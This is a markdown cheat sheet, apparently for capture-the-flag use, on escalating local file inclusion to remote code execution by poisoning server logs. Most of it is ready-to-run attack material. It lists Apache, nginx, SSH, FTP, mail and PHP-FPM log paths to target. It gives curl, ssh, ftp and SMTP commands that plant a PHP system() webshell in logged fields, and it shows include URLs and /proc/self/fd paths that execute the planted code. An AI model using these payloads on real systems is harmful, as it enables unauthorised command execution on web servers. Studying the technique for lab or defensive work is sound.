# Log Poisoning — LFI → RCE via log inclusion

## The chain — inject code into a log, then include the log

1. inject PHP/code into a log file via a request the app logs
2. `include`/`require` the log via LFI
3. the log's content runs as code → RCE

## The injectable logs — the standard targets

```
/var/log/apache2/access.log        — the UA/Referer/URI gets logged
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/access_log
/var/log/httpd/error_log
/var/log/sshd.log                  — ssh auth attempts
/var/log/auth.log                  — auth attempts
/var/log/secure
/var/log/vsftpd.log                — ftp
/var/log/proftpd/proftpd.log
/var/log/mail.log
/var/log/exim4/mainlog
/var/log/postfix.log
/var/log/php*-fpm/error.log
/var/log/php*-fpm/access.log
/var/log/mysql/mysql.log
/var/log/mysqld.log
/proc/self/fd/N                    — the app's own open logs!
```

## The injection vectors — what lands in the log

### Apache/nginx `access.log` — the User-Agent/URI/Referer

```bash
curl http://target/ -A '<?php system($_GET["c"]);?>'
curl http://target/ -H 'User-Agent: <?php system($_GET["c"]);?>'
curl http://target/ -H 'Referer: <?php system($_GET["c"]);?>'
curl 'http://target/<?php system("id");?>'     — the URI itself
```

The logged UA/Referer/URI — the request's fields land in `access.log` —
`include` the log → the logged code executes.

### `auth.log`/`secure`/`sshd.log` — the ssh-username injection

```bash
ssh '<?php system($_GET["c"]);?>'@target        — the username is logged
ssh -l '<?php system("id");?>' target
```

`auth.log` records `Failed password for invalid user <username>` —
the username is your code — `include` the log → exec.

### `vsftpd.log`/`proftpd.log` — the ftp-username injection

```bash
ftp -n target <<'EOF'
user <?php system($_GET["c"]);?>
pass x
EOF
```

The ftp-username logged.

### `mail.log`/`exim4`/`postfix` — the SMTP `MAIL FROM`/`RCPT TO` injection

```bash
telnet target 25 <<'EOF'
MAIL FROM: <?php system($_GET["c"]);?>
RCPT TO: root
DATA
<?php system($_GET["c"]);?>
.
EOF
```

SMTP `MAIL FROM`/`RCPT TO`/data — the logged sender/recipient.

### `php*-fpm/error.log` — the PHP-error injection

Trigger a PHP error containing code — the error message logs it —
`?x=<?php ...` in a malformed request.

## The include — the second half

```
?file=/var/log/apache2/access.log          — if file= is include'd
?file=php://filter/convert.base64-encode/resource=/var/log/apache2/access.log   — read, not exec
?file=/var/log/apache2/access.log&c=id     — exec the injected UA
```

For `include 'file'` — the log's raw text + your injected `<?php ...`
— the PHP tag executes, the rest is text.

## The `/proc/self/fd/N` variant — the app's own log-fd

```
?file=/proc/self/fd/3
?file=/proc/self/fd/4
```

The app's own open log-fd — `fd/3`/`fd/4` may be the access-log the
app just wrote YOUR request to — the "the log the app just opened" trick.

## The "the log is the flag" — the flag-in-log

A challenge may put the flag in a log — `access.log`/`auth.log` — the
read alone gets it — the log-injection is for RCE, the log-READ is
for flags.

## The "the log has old admin requests" — the log-archaeology

`access.log`/`auth.log` reveal past admin requests — a past `flag{...}`
in a URI, a `GET /admin/flag` — the historical-request leak.

## The "the injected code needs quoting" — the log-format constraint

`access.log` has the log-format wrapping — `<?php ...` inside a quoted
field — the code lands inside `"..."` — PHP doesn't care — it executes
the tag wherever it is — the log-format is irrelevant to execution.

## The "the code lands on multiple lines" — the multi-request injection

A multi-line payload needs multiple requests — each logged line is a
separate entry — inject one PHP statement per request — the log has
N lines, each a payload.

## Falsifiers

- the log isn't readable via LFI (path unknown, permission) → the chain
  needs a different exec path — `read-to-rce.md`'s other routes
- the `?file=` is `file_get_contents` not `include` → log-injection
  reads but doesn't exec → the read alone may still find the flag
